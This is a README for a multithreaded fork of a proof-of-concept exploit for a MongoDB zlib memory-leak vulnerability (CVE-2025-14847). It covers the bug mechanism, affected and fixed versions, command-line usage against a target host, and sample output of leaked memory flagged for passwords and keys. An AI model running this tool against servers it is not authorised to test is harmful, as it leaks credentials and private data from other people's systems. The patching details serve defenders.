# fastmongobleed

**CVE-2025-14847** - MongoDB Unauthenticated Memory Leak Exploit

Forked from [original mongobleed](https://github.com/joedesimone/mongobleed) by Joe Desimone ([@dez_](https://x.com/dez_))  
**Fork by:** SirBugs (Fares Walid)

## Enhancements in this Fork

- **Multithreading**: 10x faster scanning with configurable thread count (default: 10 threads)
- **Real-time progress**: Live progress bar showing completion percentage and leaked bytes
- **Better error handling**: Cleaner connection handling and timeout management

---

A proof-of-concept exploit for the MongoDB zlib decompression vulnerability that allows unauthenticated attackers to leak sensitive server memory.

## Vulnerability

A flaw in MongoDB's zlib message decompression returns the allocated buffer size instead of the actual decompressed data length. This allows attackers to read uninitialized memory by:

1. Sending a compressed message with an inflated `uncompressedSize` claim
2. MongoDB allocates a large buffer based on the attacker's claim
3. zlib decompresses actual data into the start of the buffer
4. The bug causes MongoDB to treat the entire buffer as valid data
5. BSON parsing reads "field names" from uninitialized memory until null bytes

## Affected Versions

| Version | Affected | Fixed |
|---------|----------|-------|
| 8.2.x | 8.2.0 - 8.2.2 | 8.2.3 |
| 8.0.x | 8.0.0 - 8.0.16 | 8.0.17 |
| 7.0.x | 7.0.0 - 7.0.27 | 7.0.28 |
| 6.0.x | 6.0.0 - 6.0.26 | 6.0.27 |
| 5.0.x | 5.0.0 - 5.0.31 | 5.0.32 |

## Usage

```bash
# Basic scan (offsets 20-8192, 10 threads)
python3 bleed.py --host <target>

# Faster with more threads
python3 bleed.py --host <target> --threads 20

# Deep scan for more data
python3 bleed.py --host <target> --max-offset 50000

# Custom range
python3 bleed.py --host <target> --min-offset 100 --max-offset 20000
```

## Options

| Option | Default | Description |
|--------|---------|-------------|
| `--host` | localhost | Target MongoDB host |
| `--port` | 27017 | Target MongoDB port |
| `--threads` | 10 | Number of concurrent threads |
| `--min-offset` | 20 | Minimum document length to probe |
| `--max-offset` | 8192 | Maximum document length to probe |
| `--output` | leaked.bin | Output file for leaked data |

## Example Output

```
[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
[*] Original Author: Joe Desimone - x.com/dez_
[*] Modified by: SirBugs (Fares Walid)
[*] Target: 192.168.1.100:27017
[*] Scanning offsets 20-8192
[*] Using 10 threads

[*] Testing connection to 192.168.1.100:27017... OK (158 bytes)

[*] Progress: 45.2% (3695/8172) - Leaks: 127 (15847 bytes)
[+] offset=  117 len=  39: ssions^\u0001�r��*YDr���
[+] offset=16582 len=1552: MemAvailable:    8554792 kB\nBuffers: ...

[*] Total leaked: 15847 bytes
[*] Unique fragments: 127
[*] Saved to: leaked.bin
[!] Found pattern: password
[!] Found pattern: key
```

## How It Works

The exploit crafts BSON documents with inflated length fields. When the server parses these documents, it reads field names from uninitialized memory until it hits a null byte. Each probe at a different offset can leak different memory regions.

Leaked data may include:
- MongoDB internal logs and state
- WiredTiger storage engine configuration
- System `/proc` data (meminfo, network stats)
- Docker container paths
- Connection UUIDs and client IPs

## References

- Original exploit: [mongobleed](https://github.com/joedesimone/mongobleed) by Joe Desimone
- CVE: CVE-2025-14847
